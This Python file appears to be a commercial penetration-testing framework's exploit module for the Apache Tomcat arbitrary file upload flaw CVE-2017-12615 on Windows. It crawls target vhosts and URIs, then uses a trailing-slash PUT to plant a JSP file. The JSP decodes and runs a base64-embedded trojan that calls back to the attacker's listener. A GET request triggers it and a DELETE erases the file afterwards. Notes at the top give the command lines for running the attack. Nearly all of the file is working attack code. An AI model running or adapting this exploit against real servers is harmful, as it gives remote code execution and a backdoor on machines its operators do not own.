#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  tomcat_file_upload.py
## Description:
##            :
## Created_On :  Tue Oct 17 2017
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
###############################################################################

import os
import re
import sys
import copy
import socket
import logging

if '.' not in sys.path:
    sys.path.append('.')

import exploitutils
import shutil

from libs.canvasos import *
from exploitutils import standard_callback_commandline
from ExploitTypes.utility import Utility

NAME                            = 'Tomcat - Arbitrary File Upload (CVE-2017-12615)'
DESCRIPTION                     = 'A bogus Tomcat may allow PUT on a bogus URI thereby allowing to push an arbitrary file at the root of a webapp (RCE)'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Apache'
DOCUMENTATION['Repeatability']  = ''
DOCUMENTATION['CVE Name']       = 'CVE-2017-12615'
DOCUMENTATION['CVE Url']        = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12615'
VERSION                         = '1.0'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [ ["Windows"] ]

CHANGELOG = """
"""

NOTES = """

Bug explanation
https://translate.google.com/translate?sl=zh-CN&tl=en&js=y&prev=_t&hl=fr&ie=UTF-8&u=https%3A%2F%2Fpaper.seebug.org%2F399%2F&edit-text=&act=url

In a nutshell:
    - The Windows API messes with bogus URIs which is why there is no problem
      on Unix servers.
    - The readOnly parameters needs to be set to "false" (not the case by default).
      and this is what allows the PUT/DELETE to be used.

Example of vulnerable configuration
----------------------------------------------------------------------
    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>false</param-value>
        </init-param>

        <init-param>
            <param-name>readonly</param-name>
            <param-value>false</param-value>       <-- Configuration weakness
        </init-param>

        <load-on-startup>1</load-on-startup>
    </servlet>
----------------------------------------------------------------------

Tested against:
    - Tomcat/8.0.45 (Windows 2003 x86) [HTTP only]
    - Apache/2.4.18 (Ubuntu) + Tomcat/8.0.45 (Windows 2003 x86) [HTTP only]

To test the module on the CLI:
    a) Start a universal listener (in this case on port 5555)
    ./commandlineInterface.py -v 17 -p 5555
    b) Execute the exploit:
    python exploits/remote/windows/tomcat_file_upload/tomcat_file_upload.py -t 192.168.50.55 -p 80 -l 192.168.50.38 -d 5555 -Odebug:true
"""


from canvasexploit import canvasexploit
from exploitutils import *
import canvasengine
import libs.spkproxy as spkproxy

VULN_PATTERN = 'HOST_IS_VULN\r\n'

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)

        self.name           = NAME
        self.port           = 80
        self.ssl            = False
        self.vhost          = ""
        self.discover       = False
        self.path           = '/'
        self.debug          = False
        self.mosdef_type    = "UNIVERSAL"

        # Globals
        self.uri_db         = {}
        self.tmppath        = None
        self.webcrawler_app = None
        self.UA             = None
        self.respath        = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))

    def getArgs(self):
        """
        Get arguments for attack
        """
        self.host     = self.target.interface
        self.port     = int(self.argsDict.get("port", self.port))
        self.vhost    = self.argsDict.get("vhost", self.vhost)
        self.ssl      = self.argsDict.get("ssl", self.ssl)
        self.discover = self.argsDict.get("discover", self.discover)
        self.path    = self.argsDict.get("path", self.path)
        self.debug    = self.argsDict.get("debug", self.debug)

        if self.path != '/':
            if self.path[-1] != '/':
                 self.path = self.path + '/'

        # TODO: authentication
        return

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def is_alive(self):
        """
        Detects if the connection can be established or not.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host,self.port))
            s.close()
            return True
        except Exception as e:
            return False

    ###
    # Sub module related API
    ###

    def get_public_vhosts(self):
        """
        This (sub)function calls the ip_to_vhosts (bing request) to build a list
        of vhosts corresponding to the IP of the target.
        """
        logging.info('Grabbing vhosts for %s' % self.host)
        app = self.engine.getModuleExploit("ip_to_vhosts")
        app.link(self)
        res = app.run()
        if not res:
            return []
        else:
            vh = self.target.get_knowledge('vhosts')
            if vh:
                return vh.known
            else:
                return []

    def build_vhost_list(self):
        """
        Build a list of vhosts candidates.
        Please note that the user is assisted as much as possible
        """
        vhost_list = []
        # vhost is set
        if self.vhost:
            if self.discover:
                vhost_list += self.get_public_vhosts()
            if self.vhost not in vhost_list:
                vhost_list += [self.vhost]
        # vhost is not set!
        else:
            if self.discover:
                vhost_list += self.get_public_vhosts()
            if not vhost_list:
                vhost_list += [self.host]
        return vhost_list

    def get_uri_list(self, vhost):
        """
        Calls the webcrawler module to fetch the URI corresponding to an IP.
        The caller may also specify the corresponding vhost.
        """
        self.argsDict['vhost'] = vhost
        self.argsDict['debug'] = self.debug
        logging.info('Grabbing URI for vhost %s' % vhost)
        if not self.webcrawler_app:
            self.webcrawler_app = self.engine.getModuleExploit("webcrawler")
        self.webcrawler_app.link(self)
        # For some reason, patching self.argsDict['port'] has no effect.
        self.webcrawler_app.port = self.port
        ret = self.webcrawler_app.run()
        if not ret:
            logging.warning('Could not fetch any URI for this vhost')
            return None
        vh = self.target.get_knowledge('URI')
        if not vh:
            logging.warning('Could not fetch any URI for this vhost')
            return None
        return vh.known

    ###
    # Trojam related API
    ###

    def __build_universal_trojan(self):
        res = True
        logging.info("Creating MOSDEF Trojans for ip: %s and port: %s" % (str(self.callback.ip), str(self.callback.port)))
        t_os = canvasos("WINDOWS")
        t_os.arch = "X86"
        try:
            ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=t_os, universal=True)
            if ret:
                filename = os.path.join(self.tmppath, "callback_windows.exe")
                with open(filename,"wb") as f:
                    f.write(self.mosdeftrojan)
        except Exception, err:
            logging.error("Problem building MOSDEF trojan: %s" % str(err))
            res = False
        return res

    def build_trojan(self):
        """
        Builds a UNIVERSAL MOSDEF trojans (x86).
        This trojan is later called by the JSP file.
        Note: This may be modified later to build another type of trojan.
        """
        return self.__build_universal_trojan()


    ###
    # Web requests related API
    ###

    def is_directory(self, path):
        """
        Returns True if the path is a directory else return False.
        This assumes that the underlying crawler does its job.
        """
        if path[-1:] == '/':
            return True
        return False

    def get_url(self, vhost, path):
        """
        Creates an URL based on the vhost and the path (URI).
        """
        url = "https" if self.ssl else "http"
        url += "://%s:%s" % (vhost, self.port)
        url += path
        return url

    def send_http_request(self, current_vhost, uri, method, data=''):
        """
        Generic wrapper around urlopen().
        """
        url = self.get_url(current_vhost, uri)
        logging.debug('%s %s' % (method, url))
        (payload, http_code) = spkproxy.urlopen(url,
                                                exploit=None,
                                                entireresponse=True,
                                                return_response_code=True,
                                                auth=None,
                                                data=data,
                                                verb=method)
        return (http_code, payload)

    def get_request(self, current_vhost, uri):
        """
        Performs a GET request.
        """
        return self.send_http_request(current_vhost, uri, 'GET')

    def put_request(self, current_vhost, uri, payload):
        """
        Performs a PUT request.
        """
        return self.send_http_request(current_vhost, uri, 'PUT', data=payload)

    def delete_request(self, current_vhost, uri):
        """
        Performs a DELETE request.
        """
        return self.send_http_request(current_vhost, uri, 'DELETE')

    def pwn_it(self, current_vhost, base_uri):
        """
        This function takes care of the trojan creation and pushes it on the
        server. It also triggers its execution and will return 1 if the payload
        successfully executed, 0 if not.
        """
        ret = 0
        normal_uri = base_uri + exploitutils.randomstring(8) + '.jsp'
        bogus_uri = normal_uri + '/'

        # First let's build the trojan
        if not self.build_trojan():
            self.setInfo("%s - done (failed)" % NAME)
            return 0

        # Then convert it into a suitable base64 payload
        f = open(self.tmppath + '/' + 'callback_windows.exe', 'rb')
        b64_payload = f.read().encode('base64')
        f.close()

        # Open the JSP template
        f = open(os.path.join(self.respath, "callback.jsp.template"))
        jsp_payload = f.read()
        f.close()

        # Replace the QUIRK keyword with the base64 encoded payload
        jsp_payload2 = jsp_payload.replace("QUIRK", b64_payload.replace('\n', ''))

        # Push the JSP
        (http_code, payload) = self.put_request(current_vhost, bogus_uri, jsp_payload2)
        logging.debug("PUT request returned error code: %s" %  http_code)

        # We do skip HTTP code verification. What's important is the payload
        # returned when the GET is used. If the upload + execution is a success
        # a special pattern is returned.
        (http_code, payload) = self.get_request(current_vhost, normal_uri)
        if 'successfully triggered' in payload.read():
            logging.info('Our payload got executed, wait for the shell!')
            ret = 1
        else:
            logging.error('Execution of the payload failed')
            ret = 0

        # Let's clean the JSP file no matter the outcode.
        (http_code, payload) = self.delete_request(current_vhost, bogus_uri)
        logging.debug("PUT request returned error code: %s" %  http_code)
        return ret


    def attack_uri(self, current_vhost, uri):
        """
        Perform the attack for a given vhost and using a specific base URI
        """
        if not self.is_directory(uri):
            return 0

        normal_uri = uri + exploitutils.randomstring(8) + '.jsp'
        bogus_uri = normal_uri + '/'

        (http_code, payload) = self.put_request(current_vhost, bogus_uri, VULN_PATTERN)
        logging.debug("PUT request returned error code: %s" %  http_code)
        (http_code, payload) = self.get_request(current_vhost, normal_uri)
        if VULN_PATTERN in payload.read():
            logging.warning('The target is vulnerable, attempting to exploit it via %s' % uri)
            # First of all, let's delete this file.
            self.delete_request(current_vhost, bogus_uri)
            # Now let's prepare & push the backdoor
            return self.pwn_it(current_vhost, uri)
        else:
            return 0

    def run(self):
        """
        runs the attempt to grab information
        """

        # TODO: update knowledge should allow to CACHE the URI things unless a force option is set
        # We need to see if the LIST is absolutely mandatory of if we could use a simple DIC['vhost']

        self.getArgs()

        if not self.callback:
            logging.error("You must setup a callback IP/port")
            return 0

        # We may need more debugging
        if self.debug:
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)

        if not self.is_alive():
            logging.error('The connection can not be established.')
            logging.error("%s - found no reachable host!" % self.name)
            self.setInfo("%s - found no reachable host!" % self.name)
            return 0

        # Throws a warning if it is likely that the user should have checked the SSL box
        if not self.ssl and self.port in [443, 8443]:
            logging.warning('You are running the webcrawler against port %d yet SSL/TLS is disabled' % self.port)
        if self.ssl and self.port in [80, 8080]:
            logging.warning('You are running the webcrawler against port %d yet SSL/TLS is enabled' % self.port)

        # Creation of the temporary directory in which we will create the trojan
        self.tmppath = self.engine.create_new_session_output_dir(str(self.callback.ip), 'temp_files')
        if not self.tmppath:
            logging.error("Could not create the session directory. Please check the available space and the permissions.")
            return 0

        self.setInfo("Running %s against %s [vhost:%s]" % (NAME, self.host, self.vhost))

        if self.debug:
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)

        vhost_list = self.build_vhost_list()
        if not vhost_list:
            # Practically this should be impossible no matter the parameters.
            logging.error("%s - unexpected error occured while building the vhost list" % self.name)
            return 0

        logging.info('Performing the attack against %s different vhost(s)' % len(vhost_list))

        for current_vhost in vhost_list:

            if self.path != '/':
                uri = self.path
                logging.info("Trying to discover if %s is vulnerable" % uri)
                ret = self.attack_uri(current_vhost, uri)
                if ret:
                    logging.info("%s for %s - done (success)" % (NAME, current_vhost))
                    self.setInfo("%s for %s - done (success)" % (NAME, current_vhost))
                    return 1
                else:
                    # OK it failed, maybe it will work with another vhost
                    continue

            uri_dic = self.get_uri_list(current_vhost)
            base_url = self.get_url(current_vhost, '/')
            if not uri_dic.has_key(base_url):
                logging.warning('No URI found for < %s >' % base_url)
                continue

            uri_list = uri_dic[base_url]['uri']
            for http_code in uri_list:
                for uri in uri_list[http_code]:

                        logging.info("Trying to discover if %s is vulnerable" % uri)
                        ret = self.attack_uri(current_vhost, uri)
                        if ret:
                            logging.info("%s for %s - done (success)" % (NAME, current_vhost))
                            self.setInfo("%s for %s - done (success)" % (NAME, current_vhost))
                            return 1

        logging.error("%s - found no exploitable URI!" % self.name)
        self.setInfo("%s - found no exploitable URI!" % self.name)
        return 0

if __name__ == '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
